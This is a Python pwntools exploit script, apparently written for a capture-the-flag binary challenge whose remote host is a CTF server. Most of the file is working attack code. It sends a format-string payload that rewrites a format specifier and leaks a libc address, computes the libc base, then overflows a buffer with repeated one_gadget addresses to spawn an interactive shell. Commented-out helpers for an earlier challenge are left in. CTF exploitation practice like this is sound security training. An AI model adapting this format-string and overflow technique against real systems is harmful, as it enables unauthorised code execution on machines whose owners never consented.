#!/usr/bin/env python3

from pwn import *

# ----------- Configuration ------------

# Configure accordingly
BINARY = './main'
HOST, PORT = 'localhost', 1337
#LIBC = None#'./libc.so.6'
#LD   = None#'./ld-linux-x86-64.so.2'
LIBC = './libc.so.6'
LD   = './ld-linux-x86-64.so.2'

# Pwntools context
context.arch = 'amd64'
context.terminal = ['tmux', 'new-window']
context.aslr = None

# Load binaries
elf  = ELF(BINARY)
libc = ELF(LIBC) if LIBC else None

# Breakpoints
gdb_breakpoints=[]

# GDB init commands
gdb_commands=[]


# ----------- Helpers ------------

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split(b'-')[0], 16)


# ----------- Launchers ------------

def make_gdbscript(p=None):
    script = "handle SIGALRM ignore\n"

    base = 0

    # PIE case (TODO fix this)
    #if p is not None:
    #    base = get_base_address(p)
    #    script += "set $_base = 0x{:x}\n".format(base)

    for bp in gdb_breakpoints:
        script += "b *0x%x\n"%(base + bp)

    for line in gdb_commands:
        script += f"{line}\n"

    return script

def gdb_attach(p):
    return gdb.attach(p, gdbscript=make_gdbscript(p=p))

def run_debug(binary, libc=None, ld=None):
    args = []
    kwargs = {}
    if libc:
        log.info('Running preloading libc "%s"' % libc)
        if ld:
            args.append(ld)
        else:
            log.warn('Using custom libc, however no loader provided. This may cause a crash')
        kwargs['env'] = {'LD_PRELOAD': libc}

    args.append(binary)
    kwargs["gdbscript"] = make_gdbscript()
    return gdb.debug(args, **kwargs)

def run_plain(binary, libc=None, ld=None):
    args = []
    kwargs = {}
    if libc:
        log.info('Running preloading libc "%s"' % libc)
        if ld:
            args.append(ld)
        else:
            log.warn('Using custom libc, however no loader provided. This may cause a crash')
        kwargs['env'] = {'LD_PRELOAD': libc}

    args.append(binary)
    #return process(args, **kwargs,)
    #return process(args, **kwargs, stdout=process.PTY)
    return process(args, **kwargs, stdout=process.PTY, stdin=process.PTY)

def start():
    if args.REMOTE:
        log.info("REMOTE PROCESS")
        HOST, PORT = 'blackhat4-0b6e5467dd540b06f709ae8a2f60e843-0.chals.bh.ctf.sa', 443                                                                                                      
        return remote(HOST, PORT, ssl=True, sni=HOST)
        return remote(HOST, PORT)

    elif args.DBG or args.DEBUG:
        log.info("LOCAL PROCESS (DEBUG)")
        return run_debug(BINARY, libc=LIBC, ld=LD)

    else:
        log.info("LOCAL PROCESS")
        return run_plain(BINARY, libc=LIBC, ld=LD)

# ----------- Functions -------------

#def new_hero(size):
#    p.sendlineafter(b'>', b'1')
#    p.sendline(str(size).encode())
#    o = p.recvuntil(b'1- Add hero to class', drop=True)
#    log.info(o)
#    m = re.search(r'You got new hero at chair (\d+) @ with location (.*)$', o.decode('utf-8'))
#    return int(m.group(1)), int(m.group(2), 16)
#
#def edit_skill(idx, desc):
#    p.sendlineafter(b'>', b'2')
#    p.sendlineafter(b'index:', str(idx).encode())
#    #log.info(p.recvuntil(b"skill:"))
#    log.info((desc).hex())
#    log.info(hex(len(desc)))
#    p.sendafter(b"skill:", desc)
#
#def kick_hero(idx):
#    p.sendlineafter(b'>', b'3')
#    p.sendlineafter(b"index:", str(idx).encode())
#
#def show_hero(idx):
#    p.sendlineafter(b'>', b'4')
#    p.sendlineafter(b'index:', str(idx).encode())
#    p.recvuntil(b"description:")
#    o = p.rcvuntil(b'1- Add hero to class', drop=True)
#    return o[1:]


#def edit_skill(idx, desc):
#    log.info(f"Edit skill: {idx}")
#    p.sendafter(b'>', pad(b'2',4))
#    p.sendafter(b'index:', pad(str(idx).encode(),4))
#    #log.info(p.recvuntil(b"skill:"))
#    log.info((desc).hex())
#    log.info(hex(len(desc)))
#    p.sendafter(b"skill:", desc)
#
#def kick_hero(idx):
#    log.info(f"Kick: {idx}")
#    p.sendafter(b'>', pad(b'3',4))
#    p.sendafter(b"index:", pad(str(idx).encode(),4))
#
#def show_hero(idx):
#    p.sendafter(b'>', pad(b'4',4))
#    p.sendafter(b"index:", pad(str(idx).encode(),4))
#    p.recvuntil(b"description:")
#    o = p.recvuntil(b'1- Add hero to class', drop=True)
#    return o[1:]

def pad(msg,sz, p=b'\0'):
    return msg + p*(sz-len(msg))

def show_page(i):
    p.sendafter(b'>', pad(b'3',8))
    p.sendafter(b'index:',pad(str(i).encode(),8))
    #o = p.recvuntil(b'1- Get empty page', drop=True)
    #return o

def renew_page(i):
    p.sendafter(b'>', pad(b'1',8))
    p.sendafter(b'index:',pad(str(i).encode(),8))

def edit_page(i, content):
    p.sendafter(b'>', pad(b'2',8))
    p.sendafter(b'index:',pad(str(i).encode(),8))
    p.sendafter(b'data:',content,0x100)

# ----------- Main Logic ------------

# Define GDB breakpoints before starting
# gdb_breakpoints.append(0x0040066a)

# Define any extra GDB command to be executed
# (this is exec after breakpoints are set)
#gdb_commands.append("continue")

# Launch the process
p = start()

# Uncomment this for attaching a debugger
#gdb_attach(p)

# Plan
# first
# 1) overwrite format specifier %256s -> %956s
# 2) leak libc
# second
# 1) overflow one gadget

ogs = [
0x4f2a5,
0x4f302,
0x10a2fc,
]

format_specifier = 0x00404090

payload = b''  # 18 
payload += f"%{0x38-len(payload)}X".encode("utf-8") # 0x39 -> '9'
payload += b'|%21$hhn'
#payload += b'|%21$lX('
#payload += b"B"*8
#for i in range(20):
#    payload += f"%{i}$X|".encode("utf-8")
payload += b"|||%41$lX|||"
#payload += b"X"*2 # PAD
#payload += b"A"*8
#payload += b"B"*8
#payload += b"C"*8
payload += p64(format_specifier+1)
payload += b'\n'

p.sendafter(b'input>', payload)

off_to_base = 0x3f3660

#p.interactive()
l = p.recvuntil(b"||||")
log.info(l)
leak_raw = p.recvuntil(b"|||", drop=True)
log.info(f"Leak raw: {leak_raw}")
leak = int(leak_raw, 16)
log.info(f"Leak: {leak:#x}")
base = leak - off_to_base
log.info(f"Base: {base:#x}")
gad = base + ogs[0]
log.info(f"Gadjet: {gad:#x}")

payload = b''
payload += b'A'*256
payload += p64(gad)*10
p.sendafter(b'input>', payload)
# Profit
p.interactive()

